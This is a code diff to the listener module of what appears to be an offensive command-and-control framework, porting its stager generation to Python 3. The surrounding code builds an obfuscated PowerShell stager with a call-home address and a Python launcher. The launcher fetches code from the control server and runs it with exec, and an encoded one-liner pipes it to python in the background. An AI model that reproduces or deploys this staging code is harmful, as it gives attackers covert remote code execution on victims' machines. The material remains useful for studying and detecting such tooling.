@@ -195,10 +195,10 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
                 #stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-                stager += "$ser='%s';$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
+                stager += "$ser=%s;$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
 
                 #Add custom headers if any
                 if customHeaders != []:
@@ -264,7 +264,7 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
@@ -325,7 +325,7 @@ class Listener(object):
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase).decode("utf-8")
                     launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
